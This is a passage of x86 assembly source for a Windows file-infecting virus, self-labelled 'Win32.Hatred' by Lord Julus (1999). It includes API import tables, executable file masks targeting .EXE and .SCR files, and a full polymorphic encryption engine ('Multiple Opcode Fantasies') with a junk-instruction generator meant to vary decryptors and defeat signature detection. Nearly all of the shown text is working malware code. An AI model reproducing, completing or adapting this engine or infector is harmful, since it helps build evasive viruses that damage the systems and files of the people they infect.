                                db "GetFileAttributesA", 0
                                db "SetFileAttributesA", 0
                                db "DeleteFileA", 0
                                db "IsDebuggerPresent", 0
                                db 0FFh


k32_API_addrs label

_GetModuleHandleA               dd 0
_ExitProcess                    dd 0
_GlobalAlloc                    dd 0
_GlobalFree                     dd 0
_GetWindowsDirectoryA           dd 0
_GetSystemDirectoryA            dd 0
_GetCurrentDirectoryA           dd 0
_SetCurrentDirectoryA           dd 0
_FindFirstFileA                 dd 0
_FindNextFileA                  dd 0
_GetDriveTypeA                  dd 0
_CloseHandle                    dd 0
_FindClose                      dd 0
_CreateFileA                    dd 0
_CreateFileMappingA             dd 0
_MapViewOfFile                  dd 0
_UnmapViewOfFile                dd 0
_SetFilePointer                 dd 0
_SetEndOfFile                   dd 0
_GetFileSize                    dd 0
_lstrlen                        dd 0
_SetFileTime                    dd 0
_GetFileTime                    dd 0
_GetProcAddress                 dd 0
_FlushViewOfFile                dd 0
_GetLastError                   dd 0
_GetSystemTime                  dd 0
_GetFileAttributes              dd 0
_SetFileAttributes              dd 0
_DeleteFileA                    dd 0
_IsDebuggerPresent              dd 0

;------------------- Advapi32 APIS

a32_API_names label
                                db "RegCreateKeyExA", 0
                                db "RegSetValueExA", 0
                                db "RegQueryValueExA", 0
                                db "RegOpenKeyExA", 0
                                db 0FFh

a32_API_addrs label

_RegCreateKeyExA                dd 0
_RegSetValueExA                 dd 0
_RegQueryValueExA               dd 0
_RegOpenKeyExA                  dd 0

;------------------- User32 APIs

u32_API_names label

                                db "MessageBoxA", 0
                                db "GetDC", 0
                                db "GetAsyncKeyState", 0
                                db "ExitWindowsEx", 0
                                db 0FFh

u32_API_addrs label

_MessageBoxA                    dd 0
_GetDC                          dd 0
_GetAsyncKeyState               dd 0
_ExitWindowsEx                  dd 0

;------------------- GDI32 APIs

g32_API_names label

                                db "BitBlt", 0
                                db 0FFh

g32_API_addrs label

_BitBlt                         dd 0


IF DEBUG                                          ;
filemasks                       db "GOAT*.EXE", 0 ; for debug mode only
                                db "GOAT*.SCR", 0 ; goat files are searched
                                db 0FFh           ;
ELSE                                              ;
filemasks                       db "*.EXE", 0     ;
                                db "*.SCR", 0     ;
                                db 0FFh           ;
ENDIF

copyright                       db "Win32.Hatred V.1.0     "
                                db "(C) 1999 by Lord Julus "

;   ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ?????
;   ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ?
;   ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ?????
;   ?????                                                             ?????
;   ? ? ? M?U?L?T?I?P?L?E  O?P?C?O?D?E  F?A?N?T?A?S?I?E?S  3?2  B?I?T ? ? ?
;   ?????                                                             ?????
;   ?????                a polymorphic engine wrote by                ?????
;   ? ? ?                                                             ? ? ?
;   ?????                    LORD JULUS - 1999 (C)                    ?????
;   ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ?????
;   ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ?
;   ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ????? ?????
;
;   VERSION 2.5
;
; Parameters on entry:
;
;         ESI = offset to code to encrypt
;         EDI = offset to the decryptor place
;         EBX = address of the offset of code to decrypt at runtime
;         ECX = length of code to decrypt
;
; Returns: nothing


MOF32 proc near                       ; Here is the actual poly engine
      pushad                          ; body

; First let's encrypt the area that will be decrypted later

      call Choose_random_registers    ; choose the random registers to use
      mov dword ptr [ebp+codeaddr], ebx
      push edi                        ; save decryptor place
      push ecx                        ; save code in bytes
      mov ebx, esi                    ;
      add ebx, ecx                    ; ebx points to the end
      sub ebx, 4                      ; minus 1 dword
      shr ecx, 2                      ; we work on dwords
      push ebx ecx                    ;
      call random32                   ; get a random 32bit dword in EAX
      mov dword ptr [ebp+offset key], eax ; which is the encryption key
      call random32                   ;
      mov dword ptr [ebp+offset keyvalue], eax ; the key increment
      mov eax, 20h                    ; the static key.
      call brandom32                  ;
      inc eax                         ;
      mov dword ptr [ebp+offset key2], eax
      mov eax, 3                      ;
      call brandom32                  ; get a random value between 0-3
      mov dword ptr [ebp+offset op1], eax ; the encryption method
      mov eax, 2                      ;
      call brandom32                  ;
      mov dword ptr [ebp+offset op2], eax ; the static key method
      mov eax, 3                      ;
      call brandom32                  ;
      mov dword ptr [ebp+offset op3], eax ; the 'next code' method
      mov eax, 3                      ;
      call brandom32                  ;
      mov dword ptr [ebp+offset op4], eax ; the operation over the key
                                      ;
      pop ecx ebx                     ; restore length and pointer
      mov eax, [ebp+key]              ; put key in eax
      mov [ebp+offset codelength], ecx;

; First we encrypt the code                          0   1   2
; op1 = operation over code with the key register  (XOR/ADD/SUB)
; op2 = operation over code with the static key    (ROR/ROL)
; op3 = operation over code with next code         (XOR/ADD/SUB)
; op4 = operation over the key with the keyvalue   (XOR/ADD/SUB)

mainloop:
      mov edx, dword ptr [ebx]             ; edx = dword to encrypt
      push eax  ebx  ecx                   ;
      mov ecx, [ebp+op3]                   ; ecx = op3
      mov eax, edx                         ;  eax, dword ptr [ebx+4]
      mov ebx, dword ptr [ebx+4]           ;
      call makeop                          ; do it!
      mov edx, eax                         ;
      pop ecx  ebx  eax                    ;
      push ecx                             ;
      mov ecx, [ebp+op2]                   ; ecx = op2
      cmp ecx, 0                           ;
      jne notror                           ;
      mov ecx, [ebp+key2]                  ;
      ror edx, cl                          ; ROR
      jmp over1                            ;
notror:                                    ;
      mov ecx, [ebp+key2]                  ;
      rol edx, cl                          ; ROL
over1:                                     ;
      pop ecx                              ;
      push eax  ebx  ecx                   ;
      mov ecx, [ebp+op1]                   ; ecx = op1
      mov ebx, eax                         ; we do  edx, eax
      mov eax, edx                         ;
      call makeop                          ;
      mov edx, eax                         ;
      pop ecx  ebx  eax                    ;
                                           ;
      mov dword ptr [ebx], edx             ;
                                           ;
      push ebx  ecx                        ;
      cmp ecx, 1                           ;
      je no_thankyou                       ;
      mov ecx, [ebp+op4]                   ; ecx = op4
      mov ebx, [ebp+keyvalue]              ; we do  eax, keyvalue
      call makeop                          ;
                                           ;
no_thankyou:                               ;
      pop ecx  ebx                         ;
                                           ;
      sub ebx, 4                           ; we go back 1 dword
      loop mainloop                        ; and loop
      jmp ok                               ; jump over

      db "Multiple Opcode Fantasies 32Bit V.2.5 by Lord Julus - 1999"

makeop:                                    ;
      cmp ecx, 0                           ; is it the first method ?
      jne notxor                           ;
      xor eax, ebx                         ; yes, XOR!
      jmp ready                            ;
notxor:                                    ;
      cmp ecx, 1                           ; or maybe second ?
      jne notadd                           ;
      add eax, ebx                         ; yes, ADD!
      jmp ready                            ;
notadd:                                    ;
      sub eax, ebx                         ; then, SUB!
ready:                                     ;
      ret                                  ;
                                           ;
ok:                                        ;
      pop ecx                              ; restore code length
      pop edi                              ; restore decryptor place
      shr ecx, 2                           ; we work on dwords
      mov dword ptr [ebp+offset key], eax  ; get decryption start key
      add ebx, 4                           ; align start of code

; eax = initial key
; ebx = initial offset
; ecx = real length in dwords
; Here we start taking, filling and writing the decryptor

      lea esi, [ebp+offset decryptor]      ; esi points to the decryptor
      mov [ebp+counter], 1                 ; counter for instructions
                                           ;
      mov eax, edi                         ; first we make some junk so that
      call makejunk                        ; the jump to the decryptor is
      call makejunk                        ; always at another offset
      mov ebx, edi                         ;
      sub ebx, eax                         ;
      mov [ebp+first_intend], ebx          ;
      call makejunk                        ; ...and some more...
                                           ;
getinstr:                                  ;
      cmp [ebp+counter], 13d               ;
      je over_all                          ;
      lodsb                                ; load one byte
      cmp al, 0FEh                         ; check for instruction end
      je over_instr                        ;
      cmp al, 0FFH                         ; check for final end
      je over_all                          ;
      stosb                                ; store the byte
      jmp getinstr                         ; do it again...
                                           ;
over_instr:                                ;
      call makeinstr                       ; fill the instruction
      cmp [ebp+counter], 11d               ;
      je no_junk_please                    ;
      call makejunk                        ; create junk after it
                                           ;
no_junk_please:                            ;
      inc [ebp+counter]                    ; increment counter
      jmp getinstr                         ; and do it again...
                                           ;
over_all:                                  ; the end...
      call makejunk                        ; ...final junk
      call makejunk                        ;
      mov [ebp+the_end], edi               ; mark the end
      call makejunk                        ; some more...
      call makejunk                        ;
      mov [ebp+end_end], edi               ; real end !
      popad                                ; restore registers
      ret                                  ; and return

;?????????????????????????????????????????????????????????????????????????????
;? Here we have the instruction maker and the junk code generator.           ?
;?????????????????????????????????????????????????????????????????????????????

makeinstr proc near                        ; The routine to fill the instr.
      pushad                               ; save all regs
      cmp [ebp+counter], 13d               ; check for counter < 13
      je ok_procs                          ;
                                           ;
      mov ebx, dword ptr [ebp+counter]     ; don't tell me that this is not
      dec ebx                              ; optimized because I know, but
      cmp ebx, 0                           ; it is very difficult to deal
      je proc01                            ; with relative shit relative
      cmp ebx, 1                           ; to different imagebases...
      je proc02                            ; so get of my back ;-)
      cmp ebx, 2                           ;
      je proc03                            ;
      cmp ebx, 3                           ;
      je proc04                            ;
      cmp ebx, 4                           ;
      je proc05                            ;
      cmp ebx, 5                           ;
      je proc06                            ;
      cmp ebx, 6                           ;
      je proc07                            ;
      cmp ebx, 7                           ;
      je proc08                            ;
      cmp ebx, 8                           ;
      je proc09                            ;
      cmp ebx, 9                           ;
      je proc10                            ;
      cmp ebx, 10                          ;
      je proc11                            ;
      cmp ebx, 11                          ;
      je proc12                            ;
      jmp ok_procs                         ;

;Here are the procedures to fill each instruction of the real decryptor

proc01:                                    ; mov preg, code_start
      and byte ptr [edi-5], 11111000b      ; clear the place for preg
      mov al, byte ptr [ebp+offset preg]   ;
      or byte ptr [edi-5], al              ; fill the preg
      mov eax, dword ptr [ebp+offset codeaddr]
      or dword ptr [edi-4], eax            ; fill the code start value
      jmp ok_procs                         ;
                                           ;
proc02:                                    ; mov kreg, key
      and byte ptr [edi-5], 11111000b      ; clear the place for kreg
      mov al, byte ptr [ebp+offset kreg]   ;
      or byte ptr [edi-5], al              ; fill the kreg
      mov eax, dword ptr [ebp+offset key]  ;
      or dword ptr [edi-4], eax            ; fill the key value
      jmp ok_procs                         ;
                                           ;
proc03:                                    ; mov lreg, code_length/8
      and byte ptr [edi-5], 11111000b      ; clear the place for lreg
      mov al, byte ptr [ebp+offset lreg]   ;
      or byte ptr [edi-5], al              ; fill the lreg
      mov eax, dword ptr [ebp+offset codelength]
      or dword ptr [edi-4], eax            ; fill the code length value
      jmp ok_procs                         ;
                                           ;
proc04:                                    ; mov creg, [preg] (mainloop)
      and byte ptr [edi-1], 11000000b      ; clear for pointer and code regs
      mov al, byte ptr [ebp+offset preg]   ;
                                           ;
      cmp al, 5                            ; take care of [EBP] exception
      jne not_ebp                          ; (when we use [EBP] addressing
      mov al, 0                            ;  mode, we need a suplemental
      stosb                                ;  00 byte after the opcode
      mov al, 5                            ;  and a 01000000b fill up - see
      and byte ptr [edi-2], 0              ;  (*))
      or byte ptr [edi-2], al              ; and fill them up...
      mov al, byte ptr [ebp+offset creg]   ;
      shl al, 3                            ; align like this: xxNNNxxx
      or byte ptr [edi-2], al              ;
      or byte ptr [edi-2], 01000000b       ; (*)
      mov increment_flag, 1                ;
      mov eax, edi                         ;
      sub eax, 3                           ;
      jmp done_i04                         ;
                                           ;
                                           ;
not_ebp:                                   ;
      or byte ptr [edi-1], al              ; and fill them up...
      mov al, byte ptr [ebp+offset creg]   ;
      shl al, 3                            ; align like this: xxNNNxxx
      or byte ptr [edi-1], al              ;
      mov eax, edi                         ;
      sub eax, 2                           ;
                                           ;
done_i04:                                  ;
      mov dword ptr [ebp+offset mainlp], eax;
      jmp ok_procs                         ;
                                           ;
proc05:                                    ;  creg, kreg
      and byte ptr [edi-1], 11000000b      ; clear for r/m and reg
      mov al, byte ptr [ebp+offset creg]   ; get creg,
      shl al, 3                            ; align like this xxNNNxxx
      or byte ptr [edi-1], al              ;
      mov al, byte ptr [ebp+offset kreg]   ;
      or byte ptr [edi-1], al              ;
      and byte ptr [edi-2], 0              ;
      mov eax, dword ptr [ebp+offset op1]  ;
      lea esi, [ebp+offset un_op_code1]    ;
      add esi, eax                         ;
      mov al, byte ptr [esi]               ;
      or byte ptr [edi-2], al              ;
      jmp ok_procs                         ;
                                           ;
proc06:                                    ;  creg, key2
      and byte ptr [edi-2], 11111000b      ;
      mov al, byte ptr [ebp+offset creg]   ; fill creg
      or byte ptr [edi-2], al              ;
      mov al, byte ptr [ebp+offset key2]   ; fill key
      or byte ptr [edi-1], al              ;
      mov eax, dword ptr [ebp+offset op2]  ;
      lea esi, [ebp+offset un_op_code3]    ;
      add esi, eax                         ;
      mov al, byte ptr [esi]               ;
      and byte ptr [edi-2], 00000111b      ;
      or byte ptr [edi-2], al              ;
      jmp ok_procs                         ;
                                           ;
proc07:                                    ;  creg, [preg+4]
      and byte ptr [edi-2], 11000000b      ;
      mov al, byte ptr [ebp+offset preg]   ;
      or byte ptr [edi-2], al              ;
      mov al, byte ptr [ebp+offset creg]   ;
      shl al, 3                            ;
      or byte ptr [edi-2], al              ;
      and byte ptr [edi-3], 0              ;
      mov eax, dword ptr [ebp+offset op3]  ;
      lea esi, [ebp+offset un_op_code1]    ;
      add esi, eax                         ;
      mov al, byte ptr [esi]               ;
      or byte ptr [edi-3], al              ;
      jmp ok_procs                         ;
                                           ;
proc08:                                    ; mov [preg], creg
      and byte ptr [edi-1], 11000000b      ; clear for pointer and code regs
      mov al, byte ptr [ebp+offset preg]   ;

      cmp al, 5                            ; take care of [EBP] exception
      jne not_ebp2                         ; (check proc04 for explanation)
      mov al, 0                            ;
      stosb                                ;
      mov al, 5                            ;
      and byte ptr [edi-2], 0              ;
      or byte ptr [edi-2], al              ; and fill them up...
      mov al, byte ptr [ebp+offset creg]   ;
      shl al, 3                            ; align like this: xxNNNxxx
      or byte ptr [edi-2], al              ;
      or byte ptr [edi-2], 01000000b       ;
      mov increment_flag, 1                ;
      jmp done_i08                         ;
                                           ;
not_ebp2:                                  ;
      or byte ptr [edi-1], al              ; and fill them up...
      mov al, byte ptr [ebp+offset creg]   ;
      shl al, 3                            ; align like this: xxNNNxxx
      or byte ptr [edi-1], al              ;
                                           ;
done_i08:                                  ;
      jmp ok_procs                         ;
                                           ;
proc09:                                    ;  kreg, keyvalue
      and byte ptr [edi-6], 0              ;
      mov eax, dword ptr [ebp+offset op4]  ;
      lea esi, [ebp+offset un_op_code2]    ;
      shl eax, 1                           ;
      add esi, eax                         ;
      mov ax, word ptr [esi]               ;
      and word ptr [edi-6], 0              ;
      or word ptr [edi-6], ax              ;
      and byte ptr [edi-5], 11111000b      ;
      mov al, byte ptr [ebp+offset kreg]   ; fill kreg
      or byte ptr [edi-5], al              ;
      mov eax, dword ptr [ebp+offset keyvalue] ; fill key
      and dword ptr [edi-4], 0             ;
      or dword ptr [edi-4], eax            ;
      jmp ok_procs                         ;
                                           ;
proc10:                                    ; sub preg, 4
      and byte ptr [edi-2], 11111000b      ;
      mov al, byte ptr [ebp+offset preg]   ;
      or byte ptr [edi-2], al              ;
      jmp ok_procs                         ;
                                           ;
proc11:                                    ; sub lreg, 1
      and byte ptr [edi-2], 11111000b      ;
      mov al, byte ptr [ebp+offset lreg]   ;
      or byte ptr [edi-2], al              ;
      jmp ok_procs                         ;
                                           ;
proc12:                                    ; jnz mainloop
      mov eax, dword ptr [ebp+offset mainlp];
      mov edx, edi                         ;
      add edx, 4                           ;
      sub eax, edx                         ;
      and dword ptr [edi], 0               ;
      or dword ptr [edi], eax              ;
      popad                                ;
      add edi, 4                           ;
      jmp special_ok_procs                 ;
                                           ;
ok_procs:                                  ; done!
      popad                                ; restore all regs
                                           ;
special_ok_procs:                          ;
      cmp [ebp+increment_flag], 1          ; If we stored suplemental bytes
      jne no_increment                     ; we need to move edi forward.
      inc edi                              ;
      mov [ebp+increment_flag], 0          ;
                                           ;
no_increment:                              ;
      ret                                  ; and return
makeinstr endp                             ;
                                           ;

;????????????????????????????????????????????????????????????????????????????

; ?굅같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같
; ?굅
; ?굅  Lord Julus' Junk Generator Module V.1.0 (March 1999)                 ?
; ?�                                                                       �?
; ?                                                                       갚?
;                                                                         갚?
; 같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같갚?

makejunk proc near                              ; This is the main junk
      push eax ebx ecx edx esi                  ;
      mov ecx, maxjunks                         ; routine.
junk_loop:                                      ;
      call _makejunk                            ;
      loop junk_loop                            ;
      pop esi edx ecx ebx eax                   ;
      ret                                       ;
makejunk endp                                   ;

      db "JGM - Junk Generator Module V.1.0 by Lord Julus - March 1999"

                                                ;
_makejunk proc near                             ; Generate junk!
      push eax                                  ;
      mov eax, 5                                ; choose between safe junks
      call brandom32                            ; and junks that might
      cmp eax, 3                                ; generate exception errors
      jae flawable_junk                         ;
                                                ;
      call make_sure_junk                       ;
      jmp exit_junk                             ;
                                                ;
flawable_junk:                                  ;
      call make_flaw_junk                       ;
                                                ;
exit_junk:                                      ;
      pop eax                                   ;
      ret                                       ; and return
_makejunk endp                                  ;
                                                ;
make_flaw_junk proc near                        ; Here we will generate
      push eax ebx ecx edx                      ; junks that could raise
      mov eax, max_junk_hunk                    ; exception errors...
      call brandom32                            ;
      inc eax                                   ;
                                                ;
      mov [ebp+flawable], 0                     ; (mark the type)
                                                ;
      mov ecx, eax                              ;
                                                ;
      mov al, 0E9h                              ; ...and so we generate a
      stosb                                     ; Jump to skip them
      mov [ebp+address_save], edi               ; save jump place
      mov eax, 0                                ;
      stosd                                     ;
                                                ;
repeat_makejunk:                                ;
      call output_one_junk                      ; now we make the junks
      loop repeat_makejunk                      ;
                                                ;
      push edi                                  ;
      sub edi, [ebp+address_save]               ; and create the jump
      mov eax, edi                              ; address
      sub eax, 4                                ;
      mov edi, [ebp+address_save]               ;
      stosd                                     ;
      pop edi                                   ;
                                                ;
      pop edx ecx ebx eax                       ;
      ret                                       ;
make_flaw_junk endp                             ;
                                                ;
make_sure_junk proc near                        ;
      push eax ebx ecx edx                      ; junks that could raise
      mov eax, max_junk_hunk                    ; exception errors...
      call brandom32                            ;
      inc eax                                   ;
                                                ;
      mov [ebp+flawable], 1                     ; (mark type)
                                                ;
      mov ecx, eax                              ;
                                                ;
repeat_makejunk_2:                              ;
      call output_one_junk                      ; now we make the junks
      loop repeat_makejunk_2                    ;
                                                ;
      pop edx ecx ebx eax                       ;
      ret                                       ;
make_sure_junk endp                             ;
                                                ;
output_one_junk proc                            ; This procedure outputs
      push ecx                                  ; one junk instruction
                                                ;
      call choose_random_disp                   ; First choose displacements
                                                ;
choose_another:                                 ;
      mov eax, Table_numbers                    ; Choose one instruction
      call brandom32                            ; table
                                                ;
      cmp [ebp+we_create_jcond], 1              ; prevent reentry
      jne no_case                               ; when creating conditional
      cmp eax, 3                                ; jumps
      je choose_another                         ;
      cmp eax, 5                                ;
      je choose_another                         ;
                                                ;
no_case:                                        ;
      cmp [ebp+flawable], 1                     ; if the instruction mustn't
      jne go_on_unstopped                       ; generate exception errors
      cmp eax, 0                                ; we cannot use table 1!
      je choose_another                         ;
                                                ;
go_on_unstopped:                                ;
      lea ebx, dword ptr [ebp+junk_table_procs] ; take out the procedure
      shl eax, 2                                ;
      add ebx, eax                              ;
      mov eax, dword ptr [ebx]                  ;
      add eax, ebp                              ;
      jmp eax                                   ; and jump to it...
                                                ;
junk_proc1:                                     ; here we use table1
      mov eax, 2                                ;
      call brandom32                            ;
      mov ebx, eax                              ; save possible increment
      add ebx, 2                                ; 2 or 3...
                                                ;
      mov eax, Table1_len                       ; take a random operation
      call brandom32                            ; from the Table1
      shl eax, 1                                ;
      lea esi, dword ptr [ebp+Table1]           ;
      add esi, eax                              ;
      lodsb                                     ;
      add eax, ebx                              ; toggle size
      stosb                                     ;
                                                ;
      lea esi, dword ptr [ebp+ModRM]            ; take a modrm byte
      call choose_jreg                          ; choose the random jreg
      mov edx, eax                              ;
      mov eax, 32                               ; and a random addressing
      call brandom32                            ; type
      mov dword ptr [ebp+row], eax              ; save the row
      shl eax, 3                                ;
      add esi, eax                              ;
      add esi, edx                              ;
      lodsb                                     ;
      stosb                                     ; store modrm
                                                ;
      mov eax, 2                                ; choose addressing type
      call brandom32                            ;
                                                ;
      cmp eax, 1                                ; is it 32bit addressing?
      je _32bit_addressing                      ;
                                                ;
      mov ax, word ptr [edi-2]                  ; if it's 16bit then we
      shl eax, 10                               ; must go behind the opcode
      dec edi                                   ;
      dec edi                                   ;
      mov al, Address_size_toggle               ; and put an Address size
      stosb                                     ; toggle prefix there
      shr eax, 10                               ;
      stosw                                     ;
                                                ;
_16bit_addressing:                              ;
      mov edx, dword ptr [ebp+row]              ; restore row in edx
      cmp edx, 6                                ; DISP16 needed ?
      jne not_exc_1                             ;
      mov ax, word ptr [ebp+disp16]             ;
      stosw                                     ;
                                                ;
      jmp finish_processing_1                   ;
                                                ;
not_exc_1:                                      ;
      cmp edx, 7                                ; Need to add a DISP8 ?
      jbe not_exc_2                             ;
      cmp edx, 16                               ;
      jae not_exc_2                             ;
      mov al, byte ptr [ebp+disp8]              ;
      stosb                                     ;
                                                ;
      jmp finish_processing_1                   ;
                                                ;
not_exc_2:                                      ;
      cmp edx, 15                               ; Need to add a DISP16 ?
      jbe not_exc_3                             ;
      cmp edx, 24                               ;
      jae not_exc_3                             ;
      mov ax, word ptr [ebp+disp16]             ;
      stosw                                     ;
                                                ;
      jmp finish_processing_1                   ;
                                                ;
not_exc_3:                                      ;
      jmp finish_processing_1                   ;
                                                ;
_32bit_addressing:                              ;
      mov edx, dword ptr [ebp+row]              ; restore row in edx
      cmp edx, 5                                ;
      jne not_exc_4                             ;
      mov eax, dword ptr [ebp+disp32]           ;
      stosd                                     ;
      jmp finish_processing_1                   ;
                                                ;
not_exc_4:                                      ;
      cmp edx, 4                                ;
      je need_sib                               ;
      cmp edx, 12                               ;
      je need_sib                               ;
      cmp edx, 20                               ;
      je need_sib                               ;
                                                ;
      cmp edx, 7                                ; Need to add a DISP8 ?
      jbe not_exc_5                             ;
      cmp edx, 16                               ;
      jae not_exc_5                             ;
      mov al, byte ptr [ebp+disp8]              ;
      stosb                                     ;
      jmp finish_processing_1                   ;
                                                ;
not_exc_5:                                      ;
      cmp edx, 15                               ; Need to add a DISP32 ?
      jbe not_exc_6                             ;
      cmp edx, 24                               ;
      jae not_exc_6                             ;
      mov eax, dword ptr [ebp+disp32]           ;
      stosd                                     ;
      jmp finish_processing_1                   ;
                                                ;
not_exc_6:                                      ;
      jmp finish_processing_1                   ;
                                                ;
need_sib:                                       ; if we need a SIB byte
      lea esi, dword ptr [ebp+ModRM]            ; we compute it rite here...
      mov eax, 8                                ;
      call brandom32                            ;
      mov ebx, eax                              ;
      mov eax, 32                               ;
      call brandom32                            ;
      cmp eax, 4                                ;
      je need_sib                               ;
      cmp eax, 12                               ;
      je need_sib                               ;
      cmp eax, 20                               ;
      je need_sib                               ;
      shl eax, 3                                ;
      add esi, eax                              ;
      add esi, ebx                              ;
      lodsb                                     ;
      stosb                                     ;
      cmp edx, 12                               ;
      jne maybe_32                              ;
      mov al, byte ptr [ebp+disp8]              ;
      stosb                                     ;
      jmp finish_processing_1                   ;
                                                ;
maybe_32:                                       ;
      cmp edx, 20                               ;
      jne finish_processing_1                   ;
      mov eax, dword ptr [ebp+disp32]           ;
      stosd                                     ;
      jmp finish_processing_1                   ;
                                                ;
finish_processing_1:                            ;
      jmp over_one_junk                         ;
                                                ;
junk_proc2:                                     ; here we use Table 2
      mov eax, 2                                ;
      call brandom32                            ;
      mov ebx, eax                              ;
      mov ebx, 1                                ; force 16/32bit
      mov eax, Table2_len                       ; take a random operation
      call brandom32                            ; from the Table2
      shl eax, 1                                ;
      lea esi, dword ptr [ebp+Table2]           ;
      add esi, eax                              ;
      lodsb                                     ;
      add eax, ebx                              ; toggle size
      stosb                                     ;
                                                ;
      xor eax, eax                              ;
      call choose_jreg                          ;
      mov ebx, eax                              ;
      shl bx, 3                                 ;
      call choose_jreg                          ;
      or bl, al                                 ;
      mov al, bl                                ;
      or al, 11000000b                          ; make reg to reg
      stosb                                     ;
                                                ;
      jmp over_one_junk                         ;
                                                ;
junk_proc3:                                     ;
      mov eax, Table3_len-2                     ; take a random operation
      call brandom32                            ; from the Table3
      shl eax, 1                                ;
      lea esi, dword ptr [ebp+Table3]           ;
      add esi, eax                              ;
      lodsb                                     ;
      xchg eax, ebx                             ;
      call choose_jreg                          ;
      add ebx, eax                              ;
      xchg eax, ebx                             ;
      stosb                                     ;
                                                ;
      jmp over_one_junk                         ;
                                                ;
junk_proc4:                                     ; Here we create short
      mov [ebp+we_create_jcond], 1              ; conditional jumps
      lea esi, dword ptr [ebp+Table4]           ;
      lodsb                                     ;
      xchg eax, ebx                             ;
      mov eax, 0eh                              ;
      call brandom32                            ;
      add ebx, eax                              ;
      xchg eax, ebx                             ;
      stosb                                     ;
      xor al, al                                ;
      stosb                                     ;
                                                ;
      push word ptr [ebp+flawable]              ;
                                                ;
      mov [ebp+flawable], 1                     ;
                                                ;
      push edi                                  ;
      call output_one_junk                      ; output one junk after
      pop ebx                                   ; the conditional jump
      push ebx                                  ;
      xchg edi, ebx                             ;
      sub ebx, edi                              ;
      add edi, ebx                              ;
      pop esi                                   ;
      dec esi                                   ;
      mov byte ptr [esi], bl                    ;
                                                ;
      mov [ebp+we_create_jcond], 0              ;
                                                ;
      pop word ptr [ebp+flawable]               ;
                                                ;
      jmp over_one_junk                         ;
                                                ;
junk_proc5:                                     ;
      call choose_jreg                          ; Make imm to reg
      mov ebx, eax                              ; choose the register
      mov eax, Table5_len                       ; take a random operation
      call brandom32                            ; from the Table1
      mov eax, 1                                ; force 16/32 bit
      mov ecx, eax                              ; save type
      shl eax, 1                                ;
      lea esi, dword ptr [ebp+Table5]           ;
      add esi, eax                              ;
      lodsb                                     ;
      add eax, ebx                              ;
                                                ;
      stosb                                     ; store opcode
                                                ;
; don't unmark these!!! I need some more conditions to make 8 bit mov
;      cmp ecx, 1                                ;
;      je mov_1632bit                            ; 16 or 32 bit?
;                                                ;
;mov_8bit:                                       ;
;      mov al, byte ptr [ebp+disp8]              ; 8 bit imm
;      stosb                                     ;
;      jmp quit_mov                              ;
                                                ;
mov_1632bit:                                    ;
      mov eax, 2                                ; choose between 16 and
      call brandom32                            ; 32 bit
      cmp eax, 0                                ;
      je do_16                                  ;
      mov eax, dword ptr [ebp+disp32]           ; 32 bit imm
      stosd                                     ;
      jmp quit_mov                              ;
                                                ;
do_16:                                          ;
      dec edi                                   ; 16 bit imm
      mov al, byte ptr [edi]                    ; we need to override
      mov byte ptr [edi+1], al                  ; the operand size
      mov byte ptr [edi], 66h                   ;
      add edi, 2                                ;
      mov ax, word ptr [ebp+disp16]             ;
      stosw                                     ;
                                                ;
quit_mov:                                       ; done!
      jmp over_one_junk                         ;
                                                ;
junk_proc6:                                     ;
      mov [ebp+we_create_jcond], 1              ;
      mov al, 0fh                               ;
      stosb                                     ;
      lea esi, dword ptr [ebp+Table6]           ;
      lodsb                                     ;
      xchg eax, ebx                             ;
      mov eax, 0eh                              ;
      call brandom32                            ;
      add ebx, eax                              ;
      xchg eax, ebx                             ;
      stosb                                     ;
      xor eax, eax                              ;
      stosd                                     ;
                                                ;
      push word ptr [ebp+flawable]              ;
                                                ;
      mov [ebp+flawable], 1                     ;
                                                ;
      push edi                                  ;
      call output_one_junk                      ;
      pop ebx                                   ;
      push ebx                                  ;
      xchg edi, ebx                             ;
      sub ebx, edi                              ;
      add edi, ebx                              ;
      pop esi                                   ;
      sub esi, 4                                ;
      mov dword ptr [esi], ebx                  ;
                                                ;
      mov [ebp+we_create_jcond], 0              ;
                                                ;
      pop word ptr [ebp+flawable]               ;
                                                ;
      jmp over_one_junk                         ;
                                                ;
junk_proc7:                                     ;
      mov eax, Table7_len                       ; take a random operation
      call brandom32                            ; from the Table1
      shl eax, 1                                ;
      lea esi, dword ptr [ebp+Table7]           ;
      add esi, eax                              ;
      lodsb                                     ;
      stosb                                     ;
                                                ;
      jmp over_one_junk                         ;
                                                ;
over_one_junk:                                  ;
                                                ;
      pop ecx                                   ;
      ret                                       ;
output_one_junk endp                            ;
                                                ;
junk_table_procs label                          ; junk procs addresses
                 dd offset junk_proc1           ;
                 dd offset junk_proc2           ;
                 dd offset junk_proc3           ;
                 dd offset junk_proc4           ;
                 dd offset junk_proc5           ;
                 dd offset junk_proc6           ;
                 dd offset junk_proc7           ;
                                                ;
choose_jreg proc near                           ; choose one random junk
      mov eax, 3                                ; register out of the 3
      call brandom32                            ; available
      cmp eax, 0                                ;
      jne not_0                                 ;
      xor eax, eax                              ;
      mov al, [ebp+jreg1]                       ;
      ret                                       ;
not_0:                                          ;
      cmp eax, 1                                ;
      jne not_1                                 ;
      xor eax, eax                              ;
      mov al, [ebp+jreg2]                       ;
      ret                                       ;
not_1:                                          ;
      xor eax, eax                              ;
      mov al, [ebp+jreg3]                       ;
      ret                                       ;
choose_jreg endp                                ;
                                                ;
choose_random_disp proc near                    ; choose random displacements
      push eax                                  ;
      call random32                             ;
      mov dword ptr [ebp+disp32], eax           ; 32bit
      call random32                             ;
      mov word ptr [ebp+disp16], ax             ; 16bit
      call random32                             ;
      mov byte ptr [ebp+disp8], al              ; 8bit
      pop eax                                   ;
      ret                                       ;
choose_random_disp endp                         ;
                                                ;
maxjunks      =  5                              ;
max_junk_hunk =  3                              ;
row           dd 0                              ;

ModRM label
; The Intel(C) instruction set comes in the following mode:
;
;       Prefixes, Opcode, Mod/RM, SIB, immediate
;
;       The Mod/RM and SIB bytes are defined in the following table:
;
;????????????????????????????????????????????????????????????????????????????
